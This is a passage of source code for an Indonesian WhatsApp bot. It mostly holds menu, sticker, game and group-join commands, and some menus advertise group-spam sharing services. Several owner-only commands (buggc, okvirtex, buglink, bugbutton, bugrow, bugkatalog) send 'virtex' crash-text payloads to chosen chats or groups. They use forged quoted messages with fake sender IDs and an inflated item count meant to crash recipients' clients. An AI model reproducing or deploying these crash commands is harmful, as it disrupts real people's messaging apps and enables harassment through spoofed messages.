			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `
Gk Ada asu`
sendButLocation(from, `${menu}`,`𝘽𝙤𝙩 𝘽𝙮 @${dtod.split("@")[0]}`, {jpegThumbnail:iye}, [{buttonId:`${prefix}owner`,buttonText:{displayText:'Owner🗣シ︎'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})
break
break
case 'bengkelsesi':
 groups = KonX.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = KonX.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await KonX.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "6285157160906@s.whatsapp.net"
        dtod = '6285157160906'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await KonX.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `
Gk Ada Kontol`
sendButLocation(from, `${menu}`,`𝘽𝙤𝙩 𝘽𝙮 @${dtod.split("@")[0]}`, {jpegThumbnail:iye}, [{buttonId:`${prefix}owner`,buttonText:{displayText:'Owner🗣シ︎'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})
break
case 'logo':
  groups = KonX.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = KonX.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await KonX.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "6285157160906@s.whatsapp.net"
        dtod = '6285157160906'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await KonX.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `
OPEN ORDER LOGO BY 𝘽𝙔 𝘽𝙊𝙏𝙕
        🌷𝙈𝙄𝙉𝘼𝙏 𝙆𝙀𝙏𝙄𝙆 𝙊𝙒𝙉𝙀𝙍🌷

────「 JASA EDIT LOGO 」────
ᴍᴇʟᴀʏᴀɴɪ
- Logo jb 
- Logo vektor
- Logo anime
- Logo kartun
- Logo text
- Logo partner
- Poster list dm 
- Poster ft 
- Frame qris

ʜᴀʀɢᴀ 1 - 5k


ᴛᴇsᴛɪ? ᴀᴅᴀ

ᴘᴀʏᴍᴇɴᴛ
Gopay - Pulsa

sɪsᴛᴇᴍ
Pilih model - edit - kirim gambar coret² - tf - kirim gambar asli - done`
sendButLocation(from, `${menu}`,`𝘽𝙤𝙩 𝘽𝙮 @${dtod.split("@")[0]}`, {jpegThumbnail:iye}, [{buttonId:`${prefix}owner`,buttonText:{displayText:'Owner🗣シ︎'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})
break
 break
case 'unchek':
 groups = KonX.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = KonX.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await KonX.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "6285157160906@s.whatsapp.net"
        dtod = '6285157160906'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await KonX.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `
gk ada`
sendButLocation(from, `${menu}`,`𝘽𝙤𝙩 𝘽𝙮 @${dtod.split("@")[0]}`, {jpegThumbnail:iye}, [{buttonId:`${prefix}owner`,buttonText:{displayText:'Owner🗣シ︎'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})
break
case 'jasher':
groups = KonX.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = KonX.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await KonX.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "6285157160906@s.whatsapp.net"
        dtod = '6285157160906'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await KonX.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `
          𝘽𝙔 𝘽𝙊𝙏𝙕
      🌷𝙈𝙄𝙉𝘼𝙏 𝙆𝙀𝙏𝙄𝙆 𝙊𝙒𝙉𝙀𝙍🌷
‣‌🇯‌‌🇦‌‌🇸‌‌🇦‌•‌🇸‌‌🇭‌‌🇦‌‌🇷‌‌🇪
┏━━━━━━━━━━━━━━━━━━
┃  MENYEDIAKAN 
┃ JASA SHARE & JASA FULL IN MEMBER
┃▰▰▰▰▰▰▰▰▰▰▰▰▰▰
┃ *🛒PAKET 50 GRUP*
┃•1× SHARE : 500
┃•2× SHARE : 1.000
┃•3× SHARE : 1.500
┃•4× SHARE : 2.000
┃▰▰▰▰▰▰▰▰▰▰▰▰▰▰
┃ *🛒PAKET 100 GRUP*
┃•1× SHARE : 1.000
┃•2× SHARE : 2.000
┃•3× SHARE : 3.000
┃•4× SHARE : 4.000
┃▰▰▰▰▰▰▰▰▰▰▰▰▰▰
┃ *🛒PAKET 150 GRUP*
┃•1× SHARE : 1.500
┃•2× SHARE : 3.000
┃•3× SHARE : 4.500
┃•4× SHARE : 6.000
┃▰▰▰▰▰▰▰▰▰▰▰▰▰▰
┃ *🛒PAKET 200 GRUP*
┃•1× SHARE : 2.000
┃•2× SHARE : 4.000
┃•3× SHARE : 6.000
┃•4× SHARE : 8.000
┃▰▰▰▰▰▰▰▰▰▰▰▰▰▰
┃ *🛒PAKET 256 GRUP*
┃•1× SHARE : 2.500
┃•2× SHARE : 5.000
┃•3× SHARE : 7.500
┃•4× SHARE : 10.000
┃▰▰▰▰▰▰▰▰▰▰▰▰▰▰
┃ *_PAKET FULL IN MEMBER_*
┃•[50 MEMBER : 5.000]
┃•[100 MEMBER : 10.000]
┃•[150 MEMBER : 15.000]
┃•[200 MEMBER : 20.000]
┃•[257 MEMBER : 25.000]
┗━━━━━━━━━━━━━━━━━━━
*💳PAYMENT*
_💸GOPAY_
_💸Pulsa_

*_DI JAMIN NGALIR PARAH🥵_*`
sendButLocation(from, `${menu}`,`𝘽𝙤𝙩 𝘽𝙮 @${dtod.split("@")[0]}`, {jpegThumbnail:iye}, [{buttonId:`${prefix}owner`,buttonText:{displayText:'Owner🗣シ︎'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})
break
case 'vps':
  groups = KonX.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = KonX.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await KonX.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "6285157160906@s.whatsapp.net"
        dtod = '6285157160906'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await KonX.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `
gk ada`
sendButLocation(from, `${menu}`,`𝘽𝙤𝙩 𝘽𝙮 @${dtod.split("@")[0]}`, {jpegThumbnail:iye}, [{buttonId:`${prefix}owner`,buttonText:{displayText:'Owner🗣シ︎'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})
 break
case 'smtp':
    groups = KonX.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = KonX.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await KonX.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "6285157160906@s.whatsapp.net"
        dtod = '6285157160906'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await KonX.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `
Gk da`
sendButLocation(from, `${menu}`,`𝘽𝙤𝙩 𝘽𝙮 @${dtod.split("@")[0]}`, {jpegThumbnail:iye}, [{buttonId:`${prefix}owner`,buttonText:{displayText:'Owner🗣シ︎'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})
break
case 'p':
groups = KonX.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = KonX.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await KonX.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "6285157160906@s.whatsapp.net"
        dtod = '6285157160906'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await KonX.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `
🗿`
sendButLocation(from, `${menu}`,`APA LOH P P🗿 ASSALAMUALAIKUM NAPA🚮\n\n${runtime(process.uptime())}`, {jpegThumbnail:iye}, [{buttonId:`${prefix}owner`,buttonText:{displayText:'Owner🗣シ︎'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})
break
case 'Assalamualaikum':
case 'Ass':
groups = KonX.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = KonX.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await KonX.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "6285157160906@s.whatsapp.net"
        dtod = '6285157160906'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await KonX.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `
ALHAMDULILLAH`
sendButLocation(from, `${menu}`,`WAALLAIKUM SALAM\n\n${runtime(process.uptime())}`, {jpegThumbnail:iye}, [{buttonId:`${prefix}menu`,buttonText:{displayText:'MENU BOTZ︎'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})
break
case '.menu':
case '#menu':
case '.help':
groups = KonX.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = KonX.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await KonX.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "6285157160906@s.whatsapp.net"
        dtod = '6285157160906'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await KonX.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `
Lihat banh🛐`
sendButLocation(from, `${menu}`,`maaf bot ini tidak pakai prefix Contoh : Menu\nAtau tekan button di bawah ini🗿\n\n${runtime(process.uptime())}`, {jpegThumbnail:iye}, [{buttonId:`${prefix}menu`,buttonText:{displayText:'Menu Bot︎'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})
break
case 'pushkontak':
groups = KonX.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = KonX.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await KonX.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "6285157160906@s.whatsapp.net"
        dtod = '6285157160906'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await KonX.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `
F lh 🗿☕`
sendButLocation(from, `${menu}`,`𝘽𝙤𝙩 𝘽𝙮 @${dtod.split("@")[0]}`, {jpegThumbnail:iye}, [{buttonId:`${prefix}owner`,buttonText:{displayText:'Owner🗣シ︎'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})
break
   
case 'owner':
           case 'creator':
             
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
               sendKontak(from, `${owner}`, `${fakeyoi}`, 'Sibukk!!')
               await sleep(1000)
               titid = 'Menu sedang erorr pakek nya 1 atau tekan button di bawah ini🚮(botz ini tidak menggunakan prefix)'
           sendButMessage(from, titid, `Klik Untuk Mengetahui Info`, [
          {
            buttonId: `${prefix}1`,
            buttonText: {
              displayText: `MENU BOTZ`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}credit`,
            buttonText: {
              displayText: `THANKS TO`,
            },
            type: 1,
          },
]);
                 break      
            
case 'f':
case 'lock':
 ikymemek = {
  "key": {
    "fromMe": true,
    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
  },
  "message": {
    "viewOnceMessage": {
      "message": {
        "imageMessage": {
          "url": "https://mmg.whatsapp.net/d/f/AjD3dQIM5hW3UkDfnnkice-eMcsMJJALEcgD9HnDGZEp.enc",
          "mimetype": "image/jpeg",
          "fileSha256": "aR3vWUsV9VZUiR+agYok8oM4UHiuhqEShMpQ6SgY9WM=",
          "fileLength": "675",
          "height": 41,
          "width": 52,
          "mediaKey": "6RDG8T+jOb0RfleWzLTclsaVn0EGRA/v78dnS+Y4S+o=",
          "fileEncSha256": "idNxqNtCaHRxuN+AX0uakPrBuiyvx84IksPUYMYgs7Y=",
          "directPath": "/v/t62.7118-24/13810909_985978368802545_7608967834334288292_n.enc?ccb=11-4&oh=359274a24041d97e91597ad1fb40e784&oe=61595B99",
          "mediaKeyTimestamp": "1630826390",
          "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACkANAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAApgAAAAAAAAAAAf/EABQQAQAAAAAAAAAAAAAAAAAAAFD/2gAIAQEAAT8AK//EABQRAQAAAAAAAAAAAAAAAAAAADD/2gAIAQIBAT8AT//EABQRAQAAAAAAAAAAAAAAAAAAADD/2gAIAQMBAT8AT//Z",
          "viewOnce": true
        }
      }
    }
  },
  "messageTimestamp": "1630826389",
  "status": "SERVER_ACK",
  "mediaData": {
    "localPath": "/data/user/0/com.gbwhatsapp/files/ViewOnce/IMG-20210905-WA0047.jpg"
  }
}
KonX.sendMessage(from, { "degreesLatitude": '', "degreesLongitude": '', "jpegThumbnail": iye}, MessageType.location, {quoted: ikymemek})
           break
           case 'add':
           return reply('*Disable By Owners*')
           case 'getcaption':
try {
reply(`${mek.quoted.title}`)
} catch {
reply(`${mek.quoted.caption}`)
}
break
case 'mengyoi':
if (!mek.key.fromMe) return;
sendBug(from)
break
case 'buggc':
if (!mek.key.fromMe) return;
if (!q) return reply('Masukan ID Grupnya')
sendBug(args[0])
break
case 'okvirtex':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
katalog(`${ngazap(prefix)}`)
katalog(`${emoji2(prefix)}`)
katalog(`${virtex90(prefix)}`)
katalog(`${virtex2(prefix)}`)
katalog(`${virtex3(prefix)}`)
katalog(`${virtex4(prefix)}`)
katalog(`${virtex5(prefix)}`)
katalog(`${virtex6(prefix)}`)
katalog(`${virtex7(prefix)}`)
katalog(`${virtex8(prefix)}`)
katalog(`${virtex9(prefix)}`)
katalog(`${virtag(prefix)}`)
break
case 'buglink':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                 KonX.toggleDisappearingMessages(from, 0)
               KonX.sendMessage(from, virtex3(prefix), text, { quoted:ftrol, contextInfo :{text: '🔥',
            "forwardingScore": 1000000000,
            isForwarded: false,
            sendEphemeral: false,
            "externalAdReply": {
                "title": `${virtex2(prefix)}`,
                "body": "",
                "previewType": "PHOTO",
                "thumbnailUrl": "https://i.ibb.co/3hrZZ6s/tsukasa.png",
                "thumbnail": fs.readFileSync(`./KonX.jpg`),
                "sourceUrl": "https://youtube.com/c/ItsMeVall"}}})
                break
        case 'bugbutton':
        if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
        KonX.toggleDisappearingMessages(from, 0)
        sendButLocation(from, `${ngazap(prefix)}`, `${virtag(prefix)}`, {jpegThumbnail:iye}, [{buttonId:`${prefix}bbaij72njnwjibdo16830nslm1782`,buttonText:{displayText:'Yahahaha'},type:1}])
        KonX.toggleDisappearingMessages(from, 0)
break
case 'bugrow':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
KonX.toggleDisappearingMessages(from, 0)
 listMsg = {
 buttonText: 'LIST MENU',
 footerText: `${emoji2(prefix)}`,
 description: `${virtex6(prefix)}`,
 sections: [
                     {
                      "title": "CieKontol",
 rows: [
                          {
                              "title": "CieBug",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
KonX.sendMessage(from, listMsg, MessageType.listMessage, {quoted:ftrol})
KonX.toggleDisappearingMessages(from, 0)
break
case 'bugkatalog':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
KonX.toggleDisappearingMessages(from, 0)
 babi = (teks) => {
             res = KonX.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 9999999, "message": teks, "footerText": `${emoji2(prefix)}`, "thumbnail": iye, "surface": 'CATALOG' }}, {quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999, // Bug
    status: 1,
    surface: 1,
    message: `${virtex6(prefix)}`,
    orderTitle: `${emoji2(prefix)}`, // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
             KonX.relayWAMessage(res)
        }
        babi(`${ngazap(prefix)}`)
        babi(`${virtag(prefix)}`)
        babi(`${virtex6(prefix)}`)
        babi(`${emoji2(prefix)}`)
        break
       
                           case 'bucinstick':
                case 'bucinsticker':{
         
                    var ano = await fetchText('https://raw.githubusercontent.com/rashidsiregar28/data/main/bucin')
                    var wifegerak = ano.split('\n')
                    var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
                    var isGif = wifegerakx.endsWith('.gif') ? true : false
                    if (!isGif) {
                    var ngebuff = await getBuffer(wifegerakx)
                    var media = getRandom('.png')
                    fs.writeFileSync(media, ngebuff)
                    await ffmpeg(`${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(mess.error.api)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
                                    if (error) return reply(mess.error.api)
									 KonX.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: freply})
								
                                    fs.unlinkSync(media)	
									fs.unlinkSync(`./sticker/${sender}.webp`)	
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./sticker/${sender}.webp`)
                    } else {
                     var ngebuff = await getBuffer(wifegerakx)
                 	let media = `./sticker/${sender}.gif`
                    fs.writeFileSync(media, ngebuff)
					reply(mess.wait)
                        await ffmpeg(`${media}`)
							.inputFormat(media.split('.')[4])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(err)
								fs.unlinkSync(media)
								let tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(mess.error.api)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
									if (error) return reply(mess.error.api)
									 KonX.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: freply})
									
                                    fs.unlinkSync(media)
									fs.unlinkSync(`./sticker/${sender}.webp`)
                                })
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./sticker/${sender}.webp`)
                    }
                    }
                    break
                    case "antihidetag":
              if (!isGroup) return reply(mess.only.group)
              if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
              if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
              if (args[0] == "enable") {
              if (isAntihidetag) return reply("Udah aktif")
              antihidetg.push(from);
              fs.writeFileSync("./database/antihidetag.json", JSON.stringify(antihidetg))
              reply("Sukses mengaktifkan fitur antihidetag di group ini ✔️")
              } else if (args[0] == "disable") {
              antihidetg.splice(from, 1);
              fs.writeFileSync("./database/antihidetag.json", JSON.stringify(antihidetg))
              reply("Sukses menonaktifkan fitur antihidetag di group ini ✔️")
              } else {
              reply('Enable untuk mengaktifkan, disable untuk menonaktifkan')
}
              break
                    case 'joinn':
if (isGroup && !itsMe) return reply('Fitur Hanya dapat digunakan dalam Private Chat!')
if (args.length < 1) return reply(`Kirim perintah *${prefix}join* link grup`)
if (!isUrl(args[0]) && !args[0].includes('chat.whatsapp.com')) return reply(mess.error.Iv)
let code = args[0].replace('https://chat.whatsapp.com/', '')
KonX.acceptInvite(code)
 .then((res) => reply(jsonformat(res)))
.catch((err) => reply(jsonformat(err)))
break
case 'tts':
					if (args.length < 1) return KonX.sendMessage(from, `Kode bahasanya mana kak? contoh : ${prefix}tts id yamate kudasai`, text, { quoted: mek })
				   const gtts = require('./lib/gtts')(args[0])
					if (args.length < 2) return KonX.sendMessage(from, `Teksnya mana kak? contoh : ${prefix}tts id yamate kudasai`, text, { quoted: mek })
					var bby = body.slice(8)
					ranm = getRandom('.mp3')
					rano = getRandom('.ogg')
					bby.length > 300
						? reply('Teks nya terlalu panjang kak')
						: gtts.save(ranm, bby, function () {
							exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
								fs.unlinkSync(ranm)
								buff = fs.readFileSync(rano)
								if (err) return reply(dla.stikga())
								KonX.sendMessage(from, buff, audio, { duration: 359996400, ptt: true, quoted: mek })
								fs.unlinkSync(rano)
							})
						})
					break
      case 'join': 
             if (args.length == 0) return reply(`Ex:- ${prefix}join https://chat.whatsapp.com`)
             if (!c) return reply('*The link?*')
             
             if (!isUrl(args[0]) && !args[0].includes('https://chat.whatsapp.com/')) return reply('*The link is invalid Tod*')
             link = args[0].replace('https://chat.whatsapp.com/','')
             fak = KonX.query({ json: ['action', 'invite', link],
             expect200: true })
             reply('*Successfully Entered Group*')
             break
             case 'tag':
			if (args.length < 1) return reply(`Penggunaan ${prefix}tag 62xnxx`)
            var nomqm = `${body.slice(5)}@s.whatsapp.net`
					tagq = `@${nomqm.split('@')[0]}` 
					KonX.sendMessage(from, tagq, text, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
			break
			case 'tagme':
                  var nomqm = mek.participant
				    tagu = `@${nomqm.split('@s.whatsapp.net')[0]}`
					KonX.sendMessage(from, tagu, text, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
					break
case 'listadmins':
  case 'listadmin':
    case 'admin':
					if (!isGroup) return reply(mess.only.group)
					teks = `List admin of group *${groupMetadata.subject}*\nTotal : ${groupAdmins.length}\n\n`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
					}
					mentions(teks, groupAdmins, true)
					break
					case 'addvn':
					return reply('*Fitur Ini Masih Dalam Perbaikan*')
					break
					case 'tebaktebakan':
              if (isGroup(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              if (tebaktebakan.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://api.xteam.xyz/game/tebaktebakan?APIKEY=${setting.xteamkey}`)
              get_result = get_result.result
              jawaban = get_result.jawaban
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.soal
              KonX.sendMessage(from, '*+* ```Tebak Tebakan```\n\n• *soal* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: mek}).then(() => {
              tebaktebakan[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebaktebakan.json", JSON.stringify(tebaktebakan))
})
              await sleep(30000)
              if (tebaktebakan.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("Jawaban: " + jawaban)
              delete tebaktebakan[sender.split('@')[0]]
              fs.writeFileSync("./database/tebaktebakan.json", JSON.stringify(tebaktebakan))
}
              gameAdd(sender, glimit)
              break
					case 'tebakin': case 'tebakgambar':
					if (tebakgambar.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada permainan yang sedang berlangsung")
                    anu = await fetchJson(`${ApiZeks}/api/tebakgambar?apikey=${zeksApikey}`)
                    resu = anu.result
                    tebak = resu.soal
                    jawaban = resu.jawaban
                    tebakgambar[sender.split('@')[0]] = jawaban.toLowerCase()
                    fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
                    console.log(jawaban)
                    tebakya = await getBuffer(tebak)
                    KonX.sendMessage(from, tebakya, image, { quoted: mek, caption: "Jawaban salah auto harus donasi" })
                   await sleep(30000)
                    if (tebakgambar.hasOwnProperty(sender.split('@')[0])) {
                        reply("Jawaban: " + jawaban)
                        delete tebakgambar[sender.split('@')[0]]
                        fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
                    }
                    break
				case 'totag':
			if (!isGroup) return reply(mess.only.group)
			if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmediau = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
